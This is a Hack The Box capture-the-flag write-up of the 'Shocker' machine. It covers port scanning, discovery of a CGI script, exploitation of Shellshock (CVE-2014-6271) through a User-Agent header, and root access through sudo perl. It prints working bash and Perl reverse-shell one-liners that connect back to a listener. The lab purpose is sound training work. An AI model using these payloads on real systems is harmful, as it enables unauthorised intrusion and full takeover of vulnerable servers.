---

title: 🟢 HTB - Shocker
author: Acivik
date: 2025-01-24 12:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Shocker, walkthrough, easy, linux]

---

![https://i.ibb.co/Rj9TB0S/Shocker.png](https://i.ibb.co/Rj9TB0S/Shocker.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

nmap detected 2 open TCP ports: 80(HTTP) and 2222(SSH)

```bash
root@kali:~/HTB/shocker# nmap -p- -sT --min-rate 10000 10.10.10.56 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 08:49 UTC
Nmap scan report for 10.10.10.56 (10.10.10.56)
Host is up (0.063s latency).
Not shown: 63401 closed tcp ports (conn-refused), 2132 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
root@kali:~/HTB/shocker# nmap -sVC -p2222,80 --min-rate 1000 10.10.10.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 08:50 UTC
Nmap scan report for 10.10.10.56 (10.10.10.56)
Host is up (0.069s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds
root@kali:~/HTB/shocker#
```

When we check the OpenSSH version, we can deduce that it is an outdated operating system. (Ubuntu 16.04)

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">WebSite</span>

There’s not interesting on page.

![https://i.ibb.co/gS6XPT6/Ekran-g-r-nt-s-2025-01-14-115145.png](https://i.ibb.co/gS6XPT6/Ekran-g-r-nt-s-2025-01-14-115145.png)

Just a image

### <span style="color:#FFC300">Directory Brute Force</span>

```bash
root@kali:~/HTB/shocker# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.10.56/FUZZ/

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cgi-bin                 [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 59ms]
icons                   [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 64ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

root@kali:~/HTB/shocker#
```

We found cgi-bin directory. The standard directory name commonly used to execute scripts via CGI is typically known as cgi-bin.
I will try detect name of script file.

```bash
root@kali:~/HTB/shocker# dirsearch -u http://shocker.htb/cgi-bin/ -e sh

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: sh | HTTP method: GET | Threads: 25 | Wordlist size: 9479

Output File: /root/HTB/shocker/reports/http_shocker.htb/_cgi-bin__25-01-14_09-27-36.txt

Target: http://shocker.htb/

[09:27:36] Starting: cgi-bin/
[09:27:39] 403 -  305B  - /cgi-bin/.ht_wsr.txt
[09:27:39] 403 -  308B  - /cgi-bin/.htaccess.bak1
[09:27:39] 403 -  308B  - /cgi-bin/.htaccess.orig
[09:27:39] 403 -  308B  - /cgi-bin/.htaccess.save
[09:27:39] 403 -  310B  - /cgi-bin/.htaccess.sample
[09:27:39] 403 -  308B  - /cgi-bin/.htaccess_orig
[09:27:39] 403 -  309B  - /cgi-bin/.htaccess_extra
[09:27:39] 403 -  306B  - /cgi-bin/.htaccess_sc
[09:27:39] 403 -  306B  - /cgi-bin/.htaccessOLD
[09:27:39] 403 -  306B  - /cgi-bin/.htaccessBAK
[09:27:39] 403 -  307B  - /cgi-bin/.htaccessOLD2
[09:27:39] 403 -  299B  - /cgi-bin/.html
[09:27:39] 403 -  298B  - /cgi-bin/.htm
[09:27:39] 403 -  304B  - /cgi-bin/.htpasswds
[09:27:39] 403 -  308B  - /cgi-bin/.htpasswd_test
[09:27:39] 403 -  305B  - /cgi-bin/.httr-oauth
[09:28:36] 200 -  119B  - /cgi-bin/user.sh
```

found it

# <span style="color:#AA0E1C"><b># Foothold: Shell as shelly</b></span>

The 2014 CVE ID that describes a remote code execution vulnerability in Bash when invoked through Apache CGI is: CVE-2014-6271

This vulnerability is commonly known as Shellshock. Let's exploit it.

```bash
User-Agent: () { :;}; echo; /bin/bash -l > /dev/tcp/10.10.14.41/1213 0<&1 2>&1
```

Port listining for reverse shell.

```bash
root@kali:~/HTB/shocker# nc -lnvp 1213
listening on [any] 1213 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.56] 33518
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
which python3
/usr/bin/python3
which python
python3 -c 'import pty;pty.spawn("/bin/bash")'
shelly@Shocker:/usr/lib/cgi-bin$
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: shelly → root</b></span>

Firstly check sudo -l output.

```bash
shelly@Shocker:/tmp$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/tmp$
```

We can execute pert as root.

```bash
shelly@Shocker:/tmp$ sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.41";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Port listining for get reverse shell from root.

```bash
root@kali:~/HTB/shocker# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.56] 40702
# id
uid=0(root) gid=0(root) groups=0(root)
#
```